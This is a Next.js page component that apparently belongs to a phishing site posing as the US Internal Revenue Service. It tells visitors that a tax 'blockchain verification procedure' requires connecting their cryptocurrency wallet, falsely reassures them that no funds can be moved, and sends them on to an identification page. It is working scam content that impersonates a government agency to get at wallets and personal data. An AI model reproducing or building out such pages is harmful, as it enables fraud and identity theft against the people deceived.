import Link from 'next/link';
import IrsShell from '@/components/IrsShell';

export default function BlockchainVerificationPage() {
  return (
    <IrsShell>
      <div style={{
        maxWidth: '860px',
        margin: '30px auto 60px auto',
        padding: '0 15px',
        fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
        color: '#212121',
      }}>
        <h1 style={{
          color: '#112e51',
          fontSize: '30px',
          fontWeight: 700,
          lineHeight: 1.3,
          marginTop: 0,
          marginBottom: '24px',
        }}>
          Blockchain Wallet Integration and Transaction Activity Verification
        </h1>

        <p style={{ fontSize: '17px', lineHeight: 1.65, color: '#212121', marginBottom: '20px' }}>
          As part of our standard blockchain verification procedure, it may be necessary to connect your designated cryptocurrency wallet to our blockchain analytics and verification system.
        </p>

        <p style={{ fontSize: '17px', lineHeight: 1.65, color: '#212121', marginBottom: '20px' }}>
          The purpose of this integration is to establish a secure connection with the relevant blockchain network and allow the system to review publicly available blockchain activity associated with the wallet. This may include transaction history, incoming and outgoing transfers, asset movements, wallet interactions, and other on-chain activity relevant to the verification process.
        </p>

        <p style={{ fontSize: '17px', lineHeight: 1.65, color: '#212121', marginBottom: '32px' }}>
          The integration is performed for verification and compliance purposes only. It does not transfer ownership of your assets to us and does not authorize us to withdraw, transfer, or otherwise dispose of your cryptocurrency.
        </p>

        <div style={{ marginTop: '36px' }}>
          <Link
            href="/identification"
            className="btn btn-primary"
            style={{
              backgroundColor: '#005ea2',
              borderColor: '#005ea2',
              color: '#ffffff',
              padding: '12px 32px',
              fontSize: '16px',
              fontWeight: 600,
              textDecoration: 'none',
              borderRadius: '4px',
              display: 'inline-block',
            }}
          >
            Continue
          </Link>
        </div>
      </div>
    </IrsShell>
  );
}
